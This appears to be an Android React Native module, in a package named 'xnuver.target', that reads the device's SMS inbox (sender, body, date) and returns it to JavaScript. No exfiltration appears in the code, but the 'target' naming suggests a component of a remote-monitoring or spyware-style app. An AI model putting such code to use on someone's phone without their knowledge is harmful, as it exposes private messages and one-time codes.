package com.zulpikarsandira.xnuver.target;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.facebook.react.bridge.Arguments;
import com.facebook.react.bridge.Promise;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;
import com.facebook.react.bridge.WritableArray;
import com.facebook.react.bridge.WritableMap;

import com.facebook.react.bridge.WritableMap;

public class SmsModule extends ReactContextBaseJavaModule {
    private static final String TAG = "SmsModule";

    public SmsModule(ReactApplicationContext context) {
        super(context);
    }

    @Override
    public String getName() {
        return "SmsModule";
    }

    @ReactMethod
    public void getSmsInbox(int limit, Promise promise) {
        try {
            WritableArray smsList = Arguments.createArray();
            Uri uriSms = Uri.parse("content://sms/inbox");
            ContentResolver cr = getReactApplicationContext().getContentResolver();

            Cursor cursor = cr.query(uriSms,
                    new String[] { "_id", "address", "body", "date" },
                    null, null, "date DESC LIMIT " + limit);

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    do {
                        WritableMap map = Arguments.createMap();
                        map.putString("id", cursor.getString(0));
                        map.putString("address", cursor.getString(1));
                        map.putString("body", cursor.getString(2));
                        map.putString("date", cursor.getString(3));
                        smsList.pushMap(map);
                    } while (cursor.moveToNext());
                }
                cursor.close();
            }

            promise.resolve(smsList);
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS: " + e.getMessage());
            promise.reject("ERROR", e.getMessage());
        }
    }
}
